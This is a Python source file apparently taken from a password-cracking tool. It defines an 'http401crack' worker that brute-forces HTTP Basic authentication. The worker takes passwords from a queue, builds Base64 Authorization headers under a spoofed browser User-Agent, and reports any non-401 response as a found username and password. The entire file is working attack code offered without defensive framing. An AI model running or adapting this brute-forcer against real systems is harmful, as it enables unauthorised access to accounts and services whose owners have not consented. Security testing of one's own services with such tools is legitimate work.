'''
module : requests


'''


import time
import requests
import base64


class http401crack:
    def __init__(self,op,args):
        self.op=op
        self.args=args

    def run(self,inputq,outputq,username):
        while True:
            try:
                passwd=inputq.get(timeout=1)
            except:
                outputq.put(1)
                time.sleep(0.5)
                exit(1)



            data=base64.b64encode((username+':'+passwd).encode('utf-8'))
            headers={
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
                "Authorization": "Basic "+data.decode(),
            }

            rep=requests.get(self.op.url,headers=headers)
            if rep.status_code!=401:
                outputq.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            else:
                if self.op.verbose!=None:
                    e='login incorrect'
                    print("%s ----- (Username:%s  Passwd:%s)" %(e,username,passwd))
                else:
                    print("Username:%s  Passwd:%s:" % (username, passwd))